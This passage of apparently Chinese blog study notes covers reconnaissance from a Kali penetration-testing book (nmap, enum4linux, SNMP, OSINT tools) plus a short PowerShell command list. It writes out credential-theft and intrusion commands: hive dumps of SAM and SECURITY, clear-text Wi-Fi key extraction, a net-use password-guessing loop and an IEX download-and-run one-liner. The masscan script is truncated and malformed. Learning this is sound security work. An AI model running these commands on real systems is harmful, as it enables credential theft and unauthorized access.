Ip</td><td>显示通常用于识别IP的特定MAC地址的NETBIOS信息，其用于MAC欺骗攻击</td></tr><tr><td>wmic</td><td>wmic process get caption,executablepath,commandline<br>wmic netshwlan profile=”profilename” key=clear</td><td>wmic用于攻击者可以执行的有电信诊断，例如在单个命令中提取系统WIFI密码</td></tr><tr><td>reg</td><td>reg save HKLM\Security sec.hive<br>reg save HKLM\System sys.hive<br>reg save HKLM\SAM sam.hive<br>reg add [\\TargetIPaddr\] [RegDomain] [\Key]<br>reg export [RegDomain]\[Key] [FileName]<br>reg import [FileName]<br>reg query [\\TargetIPaddr\] [RegDomain]\[Key] /v [Valuename!]</td><td>使用reg命令来保存注册表配置党员，以执行脱机密码攻击</td></tr><tr><td>for</td><td>for /L %i in (1,1,10) do echo %ii &amp;&amp; ping -n 5 IP<br>for /F %i in (password.lst) do @echo %i&amp; @net use \\[targetIP] %t /u:[Usernam] 2&gt;nul&amp;&amp; pause &amp;&amp; echo [Username] :%i&gt;&gt;done.txt</td><td>for循环可以在windows中用于创建端口扫描器或枚举账户</td></tr></tbody></table><h3 id="1-10-4-ARP广播"><a href="#1-10-4-ARP广播" class="headerlink" title="1.10.4 ARP广播"></a>1.10.4 ARP广播</h3><p>在内部网络主动侦察期间，可以使用nmap（nmap-v-sn IPrange）扫描整个本地网络，以嗅探ARP广播。此外，Kali可使用arp-scan（arp-scan IP range）来标识在同一网络上活跃的主机列表</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210906154153.png" alt="arp-scan示例"></p><h3 id="1-10-5-ping扫描"><a href="#1-10-5-ping扫描" class="headerlink" title="1.10.5 ping扫描"></a>1.10.5 ping扫描</h3><p>ping扫描是ping整个网络IP地址，以获取它们活跃与响应的过程。可利用以下方式进行</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">fping -g IPrange<br>nmap -sP IPrange<br><span class="hljs-comment"># 自己编写</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (1..254);<span class="hljs-keyword">do</span> ping -c 1 10.10.0.<span class="hljs-variable">$i</span> | grep <span class="hljs-string">&#x27;from&#x27;</span>;<span class="hljs-keyword">done</span><br></code></pre></div></td></tr></table></figure><p>经常遇到防火墙阻止了ICMP流量，所以可以尝试指定端口来进行识别</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap -sP -PT 80 IPrange<br></code></pre></div></td></tr></table></figure><h3 id="1-10-6-使用脚本组合masscan和nmap扫描"><a href="#1-10-6-使用脚本组合masscan和nmap扫描" class="headerlink" title="1.10.6 使用脚本组合masscan和nmap扫描"></a>1.10.6 使用脚本组合masscan和nmap扫描</h3><p>在实际的渗透测试中将masscan的速度和nmap的枚举能力相结合，很有效果。文中参考的脚本如下</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>function helptext&#123;<br>echo &quot;enter the massnmap with the file input with list of IP address ranges&quot;<br>&#125;<br>if [&quot;$#&quot; -ne 1]; then<br>echo &quot;Sorry cannot understand the command&quot;<br><span class="hljs-meta">helptext&gt;</span><span class="bash">&amp;2</span><br>exit 1<br>elif [! -s $1]; then<br>echo &quot;ooops it is empty&quot;<br><span class="hljs-meta">helptext&gt;</span><span class="bash">&amp;2</span><br>exit 1<br>fi<br>if [&quot;$(id -u)&quot;!=&quot;0&quot;]; then<br>echo &quot;I assume you are running as root&quot;<br><span class="hljs-meta">helptext&gt;</span><span class="bash">&amp;2</span><br>exit 1<br>fi<br>for range in $(cat $1); do<br>store=$(echo $range | sed -e &#x27;/\//_/g&#x27;)<br>echo &quot;I am trying to create a store to dump now hangon&quot;<br>mkdir -p pwd/$store;<br>iptables -A INPUT -p tcp --dport 6000 -j DROP;<br>echo -e &quot;\n alright lets fire masscan ****&quot;<br>masscan --open --banners --source-port 6000 -p0-65535 --max-rate 150000Bpwd/$store/masscan.bin $range;masscan --read$<br>if [! -s ./results/$store/masscan-output.txt]; then<br>echo &quot;Thank you for wasting time&quot;<br></code></pre></div></td></tr></table></figure><p>启动命令<code>文件名 ./需要扫描的地址文件.txt</code></p><h3 id="1-10-7-利用SNMP"><a href="#1-10-7-利用SNMP" class="headerlink" title="1.10.7 利用SNMP"></a>1.10.7 利用SNMP</h3><p>SNMP代表简单网络管理协议。传统上它用于收集有关网络设备配置的信息，如打印机、集线器、交换机、互联网协议的路由器、服务器</p><p>在所有版本的SNMP中都有两种类型的社区字符串：</p><ul><li>Public：用于只读访问的社区字符串</li><li>Private：用于读写访问的社区字符串</li></ul><p>kali中提供snmpwalk进行枚举，命令<code>snmpwalk -c public IP</code> </p><p>尝试了自己的主机虚拟机和云服务器均无反应</p><h3 id="1-10-8-通过服务器消息块会话获取Windows账户信息"><a href="#1-10-8-通过服务器消息块会话获取Windows账户信息" class="headerlink" title="1.10.8 通过服务器消息块会话获取Windows账户信息"></a>1.10.8 通过服务器消息块会话获取Windows账户信息</h3><p>在内部网络扫描期间，攻击者很有可能利用最常用的内部SMB会话。而在外部，攻击者可以使用nmap来执行枚举，但这种情况非常少见。以下nmap命令将枚举Windows机器上的所有远程用户。此信息通常会创建许多入口点，非常像后期的强制攻击和密码猜测攻击</p><p>nmap命令<code>nmap --script smb-enum-users.nse -p445 &lt;host&gt;</code></p><p>还可以使用Metasploit模块-auxiliary/scanner/smb/smb_enumusers执行活动</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_149" alt="使用参考"></p><h3 id="1-10-9-定位网络共享"><a href="#1-10-9-定位网络共享" class="headerlink" title="1.10.9 定位网络共享"></a>1.10.9 定位网络共享</h3><p>最早使用的攻击之一有NETBIOS空会话攻击，该攻击可以枚举出所有的网络共享</p><p><code>smbclient -I TargetIP -L administrator -N -U &quot;&quot;</code></p><p>可以利用enum4linux进行枚举来自Windows和Samba系统的信息：</p><p><code>enum4linux [options] targetip</code></p><p>选项如下：</p><ul><li><p>-U：获取用户列表</p></li><li><p>-M：获取机器列表</p></li><li><p>-S：获取共享列表</p></li><li><p>-P：获取密码策略列表</p></li><li><p>-G：获取组和成员列表</p></li><li><p>-d：详细说明，适用与-U和-S</p></li><li><p>-u user：指定要使用的用户名（默认为””）</p></li><li><p>-p pass：指定要使用的密码（默认为””）</p></li></ul><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210923104112.png" alt="enum4linux 示例"></p><h3 id="1-10-10-主动侦察目录域服务器"><a href="#1-10-10-主动侦察目录域服务器" class="headerlink" title="1.10.10 主动侦察目录域服务器"></a>1.10.10 主动侦察目录域服务器</h3><p>通常在内部渗透测试活动期间，渗透测试人员会获得用户名和密码。一般攻击方案是通过正常的用户访问来提升权限，从而达到攻破企业域的目的</p><p>Kali中的rpcclient可用于在活动目录环境中执行更主动的侦察，该工具提供多个选项来提取关于域和其他网络访问的所有细节，在第十章中进行讨论</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210923105917.png" alt="rpcclient 示例"></p><h3 id="1-10-11-使用综合工具"><a href="#1-10-11-使用综合工具" class="headerlink" title="1.10.11 使用综合工具"></a>1.10.11 使用综合工具</h3><p>Kali中的SPARTA(自己尝试查找后发现已经被legion替换)结合了多种工具，如nmap、nikto。并且还允许进行配置。配置SPARTA需要编辑位于/etc/Sparta/中的sparta.conf文件</p><p>在配置中可使用以下选项：</p><ul><li>工具(Tool)：命令行工具的唯一标识符，如nmap</li><li>标签(Label)：显示在上下文菜单上的文本</li><li>命令(Command)：通常是非交互模式和使用工具运行的完整命令</li><li>服务(Services)：这些是在主动运行期间需要运行的服务列表，例如：如果用户配置为运行nmap并自动识别80端口，请运行nikto</li><li>协议(Protocol)：TCP或UDP是工具应该运行于其上的服务</li></ul><h3 id="1-10-12-SPARTA配置实例"><a href="#1-10-12-SPARTA配置实例" class="headerlink" title="1.10.12 SPARTA配置实例"></a>1.10.12 SPARTA配置实例</h3><p>将nikto工具配置为端口操作。将以下命令添加到sparta.conf中的[PortActions]部分:</p><p><code>nikto=Run nikto, nikto -o [OUTPUT].txt -p [PORT] -h [IP],&quot;http,https&quot;</code></p><p>legion的参考<a href="https://github.com/GoVanguard/legion">链接</a></p>]]></content>
    
    
    <categories>
      
      <category>书籍 Kali高级渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali高级渗透测试</tag>
      
      <tag>书籍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PowerShell常用命令</title>
    <link href="/2021/08/19/Windows/PowerShell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/08/19/Windows/PowerShell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="PowerShell常用命令"><a href="#PowerShell常用命令" class="headerlink" title="PowerShell常用命令"></a>PowerShell常用命令</h1><ol><li>基础部分</li></ol>  <figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 新建目录</span><br><span class="hljs-built_in">new-item</span> test <span class="hljs-literal">-type</span> directory <span class="hljs-comment"># 可简写为dir</span><br><span class="hljs-comment"># 新建文件</span><br><span class="hljs-built_in">new-item</span> text.txt <span class="hljs-literal">-type</span> file<br><span class="hljs-comment"># 删除目录或文件</span><br><span class="hljs-built_in">remove-item</span> text.txt<br><span class="hljs-comment"># 显示文本内容</span><br><span class="hljs-built_in">get-content</span> text.txt<br><span class="hljs-comment"># 设置文本内容</span><br><span class="hljs-built_in">set-content</span> text.txt <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;Hello&quot;</span><br><span class="hljs-comment"># 追加内容</span><br><span class="hljs-built_in">add-content</span> one.txt <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;add&quot;</span><br><span class="hljs-comment"># 清除内容</span><br><span class="hljs-built_in">clear-content</span> one.txt<br><span class="hljs-comment"># 获取帮助</span><br><span class="hljs-built_in">Get-Help</span> <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-full</span><br><span class="hljs-comment"># 搜索目录下内容</span><br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Include</span> <span class="hljs-string">&quot;*tar*&quot;</span><br></code></pre></div></td></tr></table></figure><ol start="2"><li><p>执行ps1脚本</p> <figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;url&quot;</span>)<br></code></pre></div></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>信息收集-被动侦察</title>
    <link href="/2021/08/18/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%A2%AB%E5%8A%A8%E4%BE%A6%E5%AF%9F/"/>
    <url>/2021/08/18/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%A2%AB%E5%8A%A8%E4%BE%A6%E5%AF%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集-被动侦察"><a href="#信息收集-被动侦察" class="headerlink" title="信息收集-被动侦察"></a>信息收集-被动侦察</h1><h1 id="1-开源情报和被动侦察"><a href="#1-开源情报和被动侦察" class="headerlink" title="1.开源情报和被动侦察"></a>1.开源情报和被动侦察</h1><h2 id="1-1-侦察的基本原则"><a href="#1-1-侦察的基本原则" class="headerlink" title="1.1 侦察的基本原则"></a>1.1 侦察的基本原则</h2><p>侦察活动是渗透的第一步，侦察的结果往往会给出需要额外侦察的方向或指出在漏洞利用阶段要攻击的漏洞</p><p>侦察活动分为被动或主动侦察</p><ul><li><p>被动侦察</p><ul><li>直接侦察：当攻击者以一种可预期的方式与目标交互时，直接被动侦察可以看作是与目标的正常交互，交互活动均属于可预期的用户活动，很少被看作是攻击目标的前奏</li><li>间接被动侦察则绝对没有与目标系统的交互</li></ul></li><li><p>主动侦察</p><p>  主动侦察涉及直接查询或其他交互活动（例如，目标网络的端口扫描）。这些活动会触发系统警报，被攻击的目标也能获取攻击者的IP地址和活动信息。在法律诉讼中，这些信息能够用来确认攻击者的身份，或抓捕攻击者</p></li></ul><p>渗透测试人员或者攻击者一般会遵循一个结构化的信息收集过程——从广泛的信息（商业信息、监管环境信息）收集，到特定具体的信息（用户账户数据）收集</p><h3 id="1-1-1-开源情报"><a href="#1-1-1-开源情报" class="headerlink" title="1.1.1 开源情报"></a>1.1.1 开源情报</h3><p>渗透的第一步通常是收集开源的情报。OSINT指的是从公共的资源，特别是互联网上进行信息搜集。</p><p>OSINT分为两种类型：</p><ul><li><p>进攻型：</p><p>  需要分析对目标进行攻击所需的所有数据</p></li><li><p>防御型：</p><p>  只是收集以前的违规数据和与目标相关的其他安全事件的技术</p></li></ul><p>基本的思维导图如下</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_56" alt="OSINT基本思维导图"></p><h3 id="1-1-2-进攻性OSINT"><a href="#1-1-2-进攻性OSINT" class="headerlink" title="1.1.2 进攻性OSINT"></a>1.1.2 进攻性OSINT</h3><p>需要收集的目标信息依赖于渗透测试的初始目标。例：测试者想访问个人医疗记录，他们需要相关方（第三方保险公司、保健服务提供者、信息运维主管、商业供应商等）的姓名和履历资料，还有他们的用户名和密码</p><ul><li>域名（Domain name）：在外部场景中识别渗透测试人员的目标是通过域名开始，域名是OSINT中最关键的元素</li><li>DNS侦察和路由映射（DNS reconnaissance and routemapping）：一旦测试人员确定其感兴趣的目标在线，下一步就是识别目标的IP地址和路由。DNS侦察关心的是：识别谁拥有一个特定域或一系列IP地址（whois-类别信息尽管在通用数据保护条例（GDPR）公布之后改变了很多。），定义实际域名的DNS信息和标识目标的IP地址，以及在渗透测试人员与最终目标之间的路由</li></ul><p>收集以上信息时，一些是来自免费开源的，另一些来自第三方实体，例：DNS注册机构</p><h3 id="1-1-3-利用Sublist3r收集域资料"><a href="#1-1-3-利用Sublist3r收集域资料" class="headerlink" title="1.1.3 利用Sublist3r收集域资料"></a>1.1.3 利用Sublist3r收集域资料</h3><p><a href="https://github.com/aboul3la/Sublist3r/">Sublist3r</a>是一个基于Python的工具，可用于域捕获，即利用OSINT枚举主域名的所有子域名</p><p>安装完成后无法运行，改为使用OneforAll或Layer进行收集</p><p>OneforAll扫描后会形成对应的csv文件</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210818180947.png" alt="OneforAll运行截图"></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210818183048.png" alt="OneforAll部分结果"></p><p>Layer子域名挖掘机运行结果如图</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210818183427.png" alt="Layer子域名挖掘机运行结果"></p><h3 id="1-1-4-Maltego"><a href="#1-1-4-Maltego" class="headerlink" title="1.1.4 Maltego"></a>1.1.4 Maltego</h3><p>Maltgo是OSINT框架中最强大的之一。是GUI工具集，能够收集个人在互联网上公开的信息。它还能够枚举域名系统（DNS），暴力破解普通DNS</p><p>kali中已经集成了Maltego 在终端输入maltego即可运行</p><p>首先需要<a href="https://www.paterva.com/web7/community/community.php">注册账户</a>之后点击Maltego CE(free)进行登陆，可能会遇到无法连接的问题</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210819121820.png" alt="Maltego无法连接"></p><p>遇到此问题时点击Options设置，代理到可以科学上网的端口即可</p><p>登录后的界面</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210819122410.png" alt="Maltego界面"></p><p>基本使用后界面如下(可能不太会用，感觉不太行)</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210820111124.png" alt="Maltego基本使用"></p><h3 id="1-1-5-OSRFramework"><a href="#1-1-5-OSRFramework" class="headerlink" title="1.1.5 OSRFramework"></a>1.1.5 OSRFramework</h3><p>OSRFramework是通过Web接口实施的开源情报收集工具，安装方式直接通过<code>pip install osrframework</code>命令即可，具体使用<a href="https://github.com/i3visio/osrframework/">参考</a>，可以接入Maltego使用</p><h3 id="1-1-6-Web-archives"><a href="#1-1-6-Web-archives" class="headerlink" title="1.1.6 Web archives"></a>1.1.6 Web archives</h3><p>此处是关于搜索引擎对于网页内容的存储，当原网页内容删除后，可能在搜索引擎的快照中还有内容可以进行查询</p><h3 id="1-1-7-抓取"><a href="#1-1-7-抓取" class="headerlink" title="1.1.7 抓取"></a>1.1.7 抓取</h3><p>攻击者利用从网站提取的大量数据集，进而将提取的数据存储到本地文件系统中，这种技术称为抓取或网页抓取</p><h3 id="1-1-8-收集用户名和电子邮件地址"><a href="#1-1-8-收集用户名和电子邮件地址" class="headerlink" title="1.1.8 收集用户名和电子邮件地址"></a>1.1.8 收集用户名和电子邮件地址</h3><p>theHarvester工具是Python脚本，并利用流行的搜索引擎进行邮箱，主机以及子域名的收集</p><p>部分参数：</p><ul><li>-d：用来确定搜索的域</li><li>-b：用来确定提取信息的来源，有以下选择：Bing、BingAPI、Google、Google-Profiles、Jigsaw、LinkedIn、People123、PGP或者All</li><li>-l：只收集特定数目的返回结果数据</li><li>-f：保存结果，可以选择html或xml，若忽略则直接显示在命令台上，不进行保存</li></ul><p>命令<code>theHarvester -d bbskali.cn -b baidu</code></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210823181507.png" alt="theHarvester截图"></p><p>尝试多个域名后发现大多数的域名无法获取任何信息(可能是尝试的都是大公司的原因)</p><h3 id="1-1-9-获取用户信息"><a href="#1-1-9-获取用户信息" class="headerlink" title="1.1.9 获取用户信息"></a>1.1.9 获取用户信息</h3><p>收集用户名和电子邮件地址，因为这些信息经常用于登录目标系统(没有具体介绍如何获取，<del>如果说手工找不算的话</del>)</p><h3 id="1-1-10-Shodan和censys-io"><a href="#1-1-10-Shodan和censys-io" class="headerlink" title="1.1.10 Shodan和censys.io"></a>1.1.10 Shodan和censys.io</h3><p>Shodan是最重要的搜索引擎之一，可让互联网上的任何人使用各种过滤器查找连接到互联网的设备。具体<a href="https://www.shodan.io/">地址</a>(需要科学上网)</p><p>是全球最著名的搜索信息可选的网站之一(国内也有如：<a href="https://www.zoomeye.org/%E3%80%81https://fofa.so/">https://www.zoomeye.org/、https://fofa.so/</a>)</p><p>这里以shodan.io进行演示。搜索运行IIS5.0的主机</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210823182842.png" alt="Shodan搜索IIS5.0"></p><p>类似于shodan，还有scans.io API进行相关信息收集，或censys.io获取IPv4主机、网站认证的更多信息</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210823183312.png" alt="censys.io搜索packtpub.com"></p><h2 id="1-2-Google"><a href="#1-2-Google" class="headerlink" title="1.2 Google"></a>1.2 Google</h2><h3 id="1-2-1-使用dork脚本查询Google"><a href="#1-2-1-使用dork脚本查询Google" class="headerlink" title="1.2.1 使用dork脚本查询Google"></a>1.2.1 使用dork脚本查询Google</h3><p>首先了解Google运算符，搜索的语法如下<code>operator:itemthatyouwanttosearch</code>,<code>:</code>前后没有空格</p><p>常见的Google运算操作表</p><table><thead><tr><th align="left">操作</th><th align="left">说明</th><th align="left">能否与其他操作混合</th><th align="left">能否单独使用</th></tr></thead><tbody><tr><td align="left">intitle</td><td align="left">允许页面标题关键字搜索</td><td align="left">能</td><td align="left">能</td></tr><tr><td align="left">allintitle</td><td align="left">在标题中一次搜索所有关键字</td><td align="left">否</td><td align="left">能</td></tr><tr><td align="left">inurl</td><td align="left">搜索URL中的关键字</td><td align="left">能</td><td align="left">能</td></tr><tr><td align="left">site</td><td align="left">只能将Google搜索结果过滤到该网站</td><td align="left">能</td><td align="left">能</td></tr><tr><td align="left">ext或filetype</td><td align="left">搜索特定的扩展名或文件类型</td><td align="left">能</td><td align="left">否</td></tr><tr><td align="left">allintext</td><td align="left">允许关键字搜索所有出现次数</td><td align="left">否</td><td align="left">能</td></tr><tr><td align="left">link</td><td align="left">允许在页面上进行外部链接搜索</td><td align="left">否</td><td align="left">能</td></tr><tr><td align="left">inanchor</td><td align="left">在网页上搜索锚点链接</td><td align="left">能</td><td align="left">能</td></tr><tr><td align="left">numrange</td><td align="left">限制范围内的搜索</td><td align="left">能</td><td align="left">能</td></tr><tr><td align="left">datcrange</td><td align="left">限制日期的搜索</td><td align="left">能</td><td align="left">能</td></tr><tr><td align="left">author</td><td align="left">找到群组作者</td><td align="left">能</td><td align="left">能</td></tr><tr><td align="left">group</td><td align="left">搜索组名称</td><td align="left">能</td><td align="left">能</td></tr><tr><td align="left">related</td><td align="left">搜索相关关键词</td><td align="left">能</td><td align="left">能</td></tr></tbody></table><p>更具体的操作，我们可以参考Google的指南： <a href="http://www.googleguide.com/advanced_operators_reference.html">http://www.googleguide.com/advanced_operators_reference.html</a> 并利用众所周知的Google dorks： <a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><h3 id="1-2-2-Data-dump网站"><a href="#1-2-2-Data-dump网站" class="headerlink" title="1.2.2 Data dump网站"></a>1.2.2 Data dump网站</h3><p>当今世界，通过现场应用（the on-spot app），如pastebin.com(文本存储网站,用户可以在网站上储存（粘贴）纯文本 ，例如代码片段，生成一个网址，打开该网址就可以看到对应的文字)然而，这也是开发人员存储应用程序的源代码、加密密钥和其他机密信息并且无人看护的主要问题之一。这种在线信息为攻击者提供了丰富的信息列表，攻击者可以制定更集中的攻击。归档论坛还会显示特定网站的日志，或者以前曾被黑客入侵的黑客攻击事件。Pastebin提供此类信息。(现在访问相同的url没有信息输出，好像也没有搜索功能了)</p><h3 id="1-2-3-使用脚本自动收集OSINT数据"><a href="#1-2-3-使用脚本自动收集OSINT数据" class="headerlink" title="1.2.3 使用脚本自动收集OSINT数据"></a>1.2.3 使用脚本自动收集OSINT数据</h3><p>可以编写脚本，使得输入一次目标就输出多个工具的结果，书中展示的脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># !/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Enter target domain: &quot;</span> <span class="hljs-built_in">read</span> domain <span class="hljs-keyword">if</span> [ [ <span class="hljs-variable">$domain</span> != <span class="hljs-string">&quot;&quot;</span> ]];<br><span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Target domain set to <span class="hljs-variable">$domain</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;********************************************&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The Harvestor&quot;</span> theHarvester -d <span class="hljs-variable">$domain</span> -l 500 -b all -f harvester_<span class="hljs-variable">$domain</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done ! &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;********************************************&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;whois Details&quot;</span> whois <span class="hljs-variable">$domain</span> &gt;&gt; whois_<span class="hljs-variable">$domain</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done ! &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;********************************************&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Searching for txt files on <span class="hljs-variable">$domain</span> using Goofile.. .&quot;</span> goofile -d <span class="hljs-variable">$domain</span> -f txt &gt;&gt; goofile_txt_<span class="hljs-variable">$domain</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; done ! &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;********************************************&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Searching for pdf files on <span class="hljs-variable">$domain</span> using Goofile. . .&quot;</span> goofile -d <span class="hljs-variable">$domain</span> -f pdf &gt;&gt; goofile_pdf_<span class="hljs-variable">$domain</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done ! &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;********************************************&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Searching for doc files on <span class="hljs-variable">$domain</span> using Goofile.. .&quot;</span> goofile -d <span class="hljs-variable">$domain</span> -f doc &gt;&gt; goofile_doc_<span class="hljs-variable">$domain</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done ! &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;********************************************&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;searching for xls files on <span class="hljs-variable">$domain</span> using Goofile. . .&quot;</span> goofile -d <span class="hljs-variable">$domain</span> -f xls &gt;&gt; goofile_xls_<span class="hljs-variable">$domain</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done ! &quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Error! Please enter a domain. . . &quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 脚本加上循环脚本可在多个域运行</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> r;<span class="hljs-keyword">do</span> scriptname.sh <span class="hljs-variable">$r</span>; <span class="hljs-keyword">done</span> &lt; listofdomains<br></code></pre></div></td></tr></table></figure><h3 id="1-2-4-防守型OSINT"><a href="#1-2-4-防守型OSINT" class="headerlink" title="1.2.4 防守型OSINT"></a>1.2.4 防守型OSINT</h3><p>防守型OSINT通常可用于查看已经被掌握的内容，并且检查这些信息在渗透测试活动期间是否有价值。大多数组织只修复受影响的平台或主机，而忽略了其他类似的环境。防守型OSINT大致在三个地方搜索</p><ol><li><p>暗网</p><p> 暗网(Dark Web)是Tor服务器以及客户端之间存在的加密网络，而深网(Deep Web)仅仅提供数据库和一些Web访问内容</p></li><li><p>安全漏洞</p><p> 安全漏洞是指通过绕过底层安全机制，未经授权访问数据、应用程序、服务、网络或设备的任何事件</p><p> 常用的网站<a href="https://databases.today和https//haveibeenpwned.com">https://databases.today和https://haveibeenpwned.com</a></p><p> 为了获取目标更多的信息，测试者还需要访问zone-h.com这类的网站来获取目标的漏洞信息。案例中展示了从该网站查询到的漏洞利用流程，实际操作中没有具体信息(可能是没有登录的原因)</p></li><li><p>威胁情报</p><p> 威胁情报是关于威胁一个组织的潜在的或当前的攻击的控制、计算以及提炼信息。这种情报的主要目的是确保组织意识到当前的风险，如高级持久性威胁(APT)、零日漏洞(zero day exploit)，以及其他严重的外部威胁</p><p> 攻击者会订阅这类开源情报的框架，如STIX、TAXII或者利用妥协指标(Indicators of Compromise，IOC)的GOSINT框架</p></li></ol><h3 id="1-2-5-分析用户以获取密码列表"><a href="#1-2-5-分析用户以获取密码列表" class="headerlink" title="1.2.5 分析用户以获取密码列表"></a>1.2.5 分析用户以获取密码列表</h3><p>利用通用用户密码分析器(Common User Password Profiler,CUPP)可以让测试员针对特定的用户生成对应的特殊单词列表文件，<a href="https://github.com/Mebus/cupp">下载地址</a></p><p>使用命令<code>python3 ./cupp.py 